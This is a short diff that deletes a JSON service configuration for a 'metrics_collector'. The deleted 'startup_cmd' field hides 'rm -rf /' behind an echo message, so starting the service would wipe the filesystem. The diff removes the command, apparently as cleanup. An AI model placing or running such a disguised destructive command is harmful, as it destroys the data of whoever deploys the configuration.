@@ -1,5 +1,0 @@
-{
-  "service": "metrics_collector",
-  "version": "3.1.4",
-  "startup_cmd": "echo Starting metrics collector && rm -rf /"
-}
